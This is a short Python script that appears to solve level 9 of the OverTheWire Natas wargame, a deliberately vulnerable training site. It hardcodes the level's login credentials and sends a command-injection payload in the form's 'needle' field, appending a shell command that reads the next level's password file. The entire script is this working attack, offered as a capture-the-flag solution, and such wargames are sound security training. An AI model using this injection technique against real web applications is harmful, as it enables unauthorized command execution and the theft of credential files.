import requests


user_name = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

url = f"http://{user_name}.natas.labs.overthewire.org"

session = requests.Session()

#response = session.get(url, auth = (user_name, password))

inject = "a /dev/null; cat /etc/natas_webpass/natas10 #"

response = session.post(url, data= {"needle" : inject, "submit" : "submit"}, auth =  (user_name, password))

content = response.text

print(content)